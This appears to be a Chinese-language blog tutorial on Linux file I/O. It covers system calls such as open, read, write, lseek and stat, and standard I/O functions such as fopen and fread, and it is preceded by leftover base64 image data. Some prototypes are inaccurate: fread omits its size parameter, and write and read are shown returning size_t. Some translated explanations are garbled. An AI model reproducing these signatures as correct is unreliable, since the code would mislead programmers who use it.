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9/+9vfbi6//PJSr6997WslD4AkX/XrRxAN7EVRFEW9pMDeKFr17L3+9a8vQNNpIIt3Txj3gx/8YHP22WcXyGrbP//5zwJ6Qr977LFHs9122zXvfOc7yydYq55AYHfiiSc2a6+9dvOxj32sue2220qfwWpg63vf+17xIN58880FLueaa65mjTXWeEWfPYB13333NR//+Mebvfbaq9l+++2b9dZbr1lzzTWbo446qsBku5zgzWCTk08+uXgq9QN0MW244YbNbrvt1px33nnl2qn24osvNvfee2/zuc99rnwvxL3ttts2m266abPWWmuVNlNX9esGv71ugb0oiqKolxTYG0WbHOyBJEAGwAzYeN/73tc8/vjjE779N6ABMaN5eQDB14UXXlg+DznkkAJRoM5+PHc8ajvttFPphwcyHn300Qkp/bssp512WnPkkUcW75x9Z5xxxmbRRRdtfvKTn0zY69+DSnj0eOXk4xh5AtJTTz212X333QtoXnvttWV/IekHHniggOp+++1XQFO/RHLsscceW/7mtax1cx19+MMfLgNW9GMU4ubRA39nnXVWgVb1lSdAbbdJP1hgL4qiKOolBfZG0SYHe9W+9a1vFTBYeeWVywmppr2/+MUvNmeeeWYBH2FSXrennnqqhD/B1Ec/+tHiaWM//elPS7gVcAGmH/3oR2U706ZgkudNeJS3cMEFFyxQAk6qOcax0pDWD3/4w+JdZAaQGFTynxdJc9xxx5VtjnWeDPYw2AQoVjOlzPe///0Clueee25z3XXXFcBVXtfWcsstV0K8nSa8feONN5bjPvvZzzZ33XVXX4VzA3tRFEVRLymwN4o2XNjTvnPMMUcBBG1cTb81oU0hXt6zNvA8++yzBfQAE88bA1c8YTvuuGOZ6gUwVeO9e+9731ume+EpA3ELLbRQOb4Ney4EoeCdd965QNlLL7004Zt/G3iRxlVXXVXgTz873j5hZvX405/+NGHPf5sy8z4K04JNffvA2yyzzNK88Y1vLOkICXf2G5Sv/oXKGc9eFEVRFE25AnujaMOFvZtuuql5y1ve8grPHoibfvrpm3e9610T61/76PGQ7b///sXLdsIJJ5RtDNTpXwemhGKZEC/Asr/wqXKBx26wx5s300wzNRtttFHXNje4ow4AAWjCtKuvvnrx3LlG9B1UtvYoX967JZdcsszrJy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" alt></p>
<center>Linux系统中各种文件函数与用户、设备驱动程序、内核和硬件之间的关系</center>



<h1 id="Low-Level-File-Access"><a href="#Low-Level-File-Access" class="headerlink" title="Low-Level File Access"></a>Low-Level File Access</h1><p>每个正在运行的程序（称为进程）都有许多与之关联的文件描述符。<br>这些是可用于访问打开的文件或设备的小整数。<br>程序启动时，通常已经打开了其中三个描述符。 这些是：</p>
<pre class="line-numbers language-none"><code class="language-none">0：标准输入
1：标准输出
2：标准误差<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token class-name">size_t</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">int</span> fildes<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>Description:</p>
<p>写系统调用安排将buf中的前n个字节写入与文件描述符fildes关联的文件中。 它返回实际写入的字节数。 如果函数返回0，则表示未写入任何数据。 如果返回-1，则说明写调用中存在错误，该错误将在errno全局变量中指定。</p>
<h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token class-name">size_t</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fildes<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>Description:</p>
<p>读取系统调用从与文件描述符fildes关联的文件中读取最多nbytes字节的数据，并将其放置在数据区域buf中。 它返回实际读取的数据字节数，该数目可能少于请求的数目。 如果读取调用返回0，则表示没有任何读取内容。 它到达了文件的末尾。 同样，调用中的错误将导致其返回–1。</p>
<h2 id="open"><a href="#open" class="headerlink" title="open"></a>open</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token keyword">int</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">int</span> oflags<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">int</span> oflags<span class="token punctuation">,</span> <span class="token class-name">mode_t</span> mode<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Description:</p>
<p>open建立到文件或设备的访问路径。 如果成功，则open返回新文件描述符；如果失败，则返回-1，这时open还将设置全局变量errno，以指示失败的原因。</p>
<p>要打开的文件或设备的名称作为参数传递，路径； oflags参数用于指定打开文件时要执行的操作。<br>将错误指定为强制文件访问模式和其他可选模式的组合。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Mode</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>O_RDONLY</td>
<td>Open for read-only</td>
</tr>
<tr>
<td>O_WRONLY</td>
<td>Open for write-only</td>
</tr>
<tr>
<td>O_RDWR</td>
<td>Open for reading and writing</td>
</tr>
</tbody>
</table>
</div>
<p>该调用还可以在oflags参数中包括以下可选模式的组合（使用按位或）：</p>
<pre class="line-numbers language-none"><code class="language-none">O_APPEND: 将写入的数据放在文件末尾。
O_TRUNC:  将文件的长度设置为零，丢弃现有内容。
O_CREAT:  根据需要创建文件，并在模式下指定权限。
O_EXCL:   与O_CREAT一起使用，确保调用者创建文件。 
          这样可以防止两个程序同时创建文件。 如果文件已经存在，则打开将失败。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用 <code>O_CREAT</code> 标志打开时创建文件时，必须使用三参数形式。 模式，第三个参数是由头文件 <code>sys /stat.h</code> 中定义的标志的按位”或”构成的。 这些是：</p>
<pre class="line-numbers language-none"><code class="language-none">S_IRUSR：读取权限，所有者
S_IWUSR：写入权限，所有者
S_IXUSR：执行权限，所有者
S_IRGRP：读取权限，组
S_IWGRP：写入权限，组
S_IXGRP：执行权限，组
S_IROTH：读取权限，其他
S_IWOTH：写权限，其他
S_IXOTH：执行权限，其他<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例如：<br><code>open(&quot;myfile&quot;, O_CREAT, S_IRUSR|S_IXOTH);</code></p>
<p>umask是一个系统变量，它对创建文件时要使用的文件权限进行编码（设置）。<br>您可以通过执行umask命令来提供新值来更改变量。<br>当我们通过open调用创建文件时，会将mode参数与umask进行比较。 在umask中也已设置的mode参数中的任何位设置都将被删除。</p>
<h2 id="close"><a href="#close" class="headerlink" title="close"></a>close</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">int</span> fildes<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>Description:</p>
<p>我们使用close终止文件描述符，fildes及其文件之间的关联。 文件描述符可用于重用。 如果成功则返回0，如果错误则返回-1。</p>
<h2 id="lseek"><a href="#lseek" class="headerlink" title="lseek"></a>lseek</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token class-name">off_t</span> <span class="token function">lseek</span><span class="token punctuation">(</span><span class="token keyword">int</span> fildes<span class="token punctuation">,</span> <span class="token class-name">off_t</span> offset<span class="token punctuation">,</span> <span class="token keyword">int</span> whence<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>lseek系统调用设置文件描述符fildes的读/写指针；<br>我们可以将指针设置为文件中的绝对位置或相对于当前位置或文件末尾的位置。</p>
<p>offset参数用于指定位置，whence参数指定如何使用偏移量。 wherece可以是以下之一：</p>
<pre class="line-numbers language-none"><code class="language-none">SEEK_SET:偏移量是绝对位置
SEEK_CUR:偏移量相对于当前位置
SEEK_END:偏移量相对于文件末尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>lseek返回偏移量（以字节为单位），偏移量是从文件指针所设置到的文件的开头开始的；如果失败，则返回-1。</p>
<h2 id="fstat-stat-lstat"><a href="#fstat-stat-lstat" class="headerlink" title="fstat, stat, lstat"></a>fstat, stat, lstat</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token keyword">int</span> <span class="token function">fstat</span><span class="token punctuation">(</span><span class="token keyword">int</span> fildes<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">stat</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">stat</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">stat</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">lstat</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">stat</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>fstat系统调用返回有关与打开的文件描述符关联的文件的状态信息。 信息被写入结构buf，其地址作为参数传递。</p>
<p>相关功能stat和lstat返回命名文件的状态信息。<br>它们产生相同的结果，除非文件是符号链接。 lstat返回有关链接本身的信息，而stat返回有关链接引用的文件的信息。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>stat Member</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>st_mode</td>
<td>File permissions and file-type information</td>
</tr>
<tr>
<td>st_ino</td>
<td>The inode associated the file</td>
</tr>
<tr>
<td>st_dev</td>
<td>The device the file resides on</td>
</tr>
<tr>
<td>st_uid</td>
<td>The user identity of the file owner</td>
</tr>
<tr>
<td>st_gid</td>
<td>The group identity of the file owner</td>
</tr>
<tr>
<td>st_atime</td>
<td>The time of last access</td>
</tr>
<tr>
<td>st_ctime</td>
<td>The time of last change to permissions,owner,group,or content</td>
</tr>
<tr>
<td>st_mtime</td>
<td>The time of last modification to contents</td>
</tr>
<tr>
<td>st_nlink</td>
<td>The number of hard links to the file</td>
</tr>
</tbody>
</table>
</div>
<p>stat结构中返回的st_mode标志还具有在头文件 <code>sys / stat.h</code> 中定义的许多关联宏。<br>这些宏包括权限和文件类型标志的名称以及一些掩码，以帮助测试特定的类型和权限。<br>权限标志与前面的开放系统调用相同。 </p>
<pre class="line-numbers language-none"><code class="language-none">文件类型标志包括
S_IFBLK:条目是块特殊设备
S_IFDIR:条目是目录
S_IFCHR:条目是字符特殊设备
S_IFIFO:条目是一个FIFO（命名管道）
S_IFREG:条目是常规文件
S_IFLNK:条目是一个符号链接
其他模式标志包括
S_ISUID:条目在执行时具有setUID
S_ISGID:条目在执行时具有setGID
解释st_mode标志的掩码包括
S_IFMT:文件类型
S_IRWXU:用户读&#x2F;写&#x2F;执行权限
S_IRWXG:组读取&#x2F;写入&#x2F;执行权限
S_IRWXO:他人的读取&#x2F;写入&#x2F;执行权限
定义了一些宏来帮助确定文件类型。
S_ISBLK:测试块特殊文件
S_ISCHR:测试字符专用文件
S_ISDIR:测试目录
S_ISFIFO:测试FIFO
S_ISREG:测试常规文件
S_ISLNK:测试符号链接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="dup-dup2"><a href="#dup-dup2" class="headerlink" title="dup, dup2"></a>dup, dup2</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token keyword">int</span> fildes<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">dup2</span><span class="token punctuation">(</span><span class="token keyword">int</span> fildes<span class="token punctuation">,</span> <span class="token keyword">int</span> fildes2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>dup系统调用提供了一种复制文件描述符的方式，为我们提供了两个或更多访问同一文件的不同描述符。<br>dup系统调用复制文件描述符fildes，并返回新的描述符。<br>dup2系统调用通过指定用于复制的描述符有效地将一个文件描述符复制到另一个文件描述符。</p>
<h1 id="The-Standard-I-O-Library"><a href="#The-Standard-I-O-Library" class="headerlink" title="The Standard I/O Library"></a>The Standard I/O Library</h1><p>标准I / O库及其头文件 <code>stdio.h</code> 为低级I / O系统调用提供了通用接口。<br>该库提供了许多用于格式化输出和扫描输入的复杂功能。<br>它还负责设备的缓冲要求。<br>低级文件描述符的等效项称为流，并实现为指向结构 <code>FILE *</code> 的指针。<br>启动程序时，将自动打开三个文件流。 它们是<strong>stdin</strong>，<strong>stdout</strong> 和 <strong>stderr</strong>。</p>
<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
FILE <span class="token operator">*</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>mode<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>它主要用于文件和终端的输入和输出。<br>fopen打开由filename参数命名的文件，并将流与其关联。 mode参数指定如何打开文件。 这是以下字符串之一：</p>
<pre class="line-numbers language-none"><code class="language-none">&quot;r&quot; or &quot;rb&quot;: Open for reading only
&quot;w&quot; or &quot;wb&quot;: Open for writing, truncate to zero length
&quot;a&quot; or &quot;ab&quot;: Open for writing, append to end of file
&quot;r+&quot; or &quot;rb+&quot; or &quot;r+b&quot;: Open for update (reading and writing)
&quot;w+&quot; or &quot;wb+&quot; or &quot;w+b&quot;: Open for update, truncate to zero length
&quot;a+&quot; or &quot;ab+&quot; or &quot;a+b&quot;: Open for update, append to end of file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果成功，则fopen返回一个非空的FILE *指针。 如果失败，则返回在stdio.h中定义的值NULL。</p>
<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token class-name">size_t</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nitems<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>fread库功能用于从文件流读取数据。 从数据流中将数据读入ptr给定的数据缓冲区中。 fread和fwrite都处理数据记录。<br>这些由记录大小，大小以及要传输的记录数，位数确定。 它返回成功读入数据缓冲区的项目数。<br>在文件末尾，可能返回的nitem少于零，包括零。</p>
<h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token class-name">size_t</span> <span class="token function">fwrite</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nitems<span class="token punctuation">,</span> FILE<span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>它从指定的数据缓冲区中获取数据记录，并将其写入输出流。 它返回成功写入的记录数。</p>
<h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">fclose</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>fclose库函数关闭指定的流，从而导致所有未写入的数据被写入。</p>
<h2 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">fflush</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>fflush库函数使文件流上的所有未完成数据立即被写入。</p>
<p>缓冲流</p>
<p>流有3种不同的缓冲类型，分别是：全缓冲、行缓冲、无缓冲。<br>在LINUX系统中，对新打开的流采用如下默认缓冲类型：</p>
<ul>
<li>标准错误总是无缓冲的。</li>
<li>其他的流若引用交互设备则是行缓冲，否则是全缓冲的。</li>
</ul>
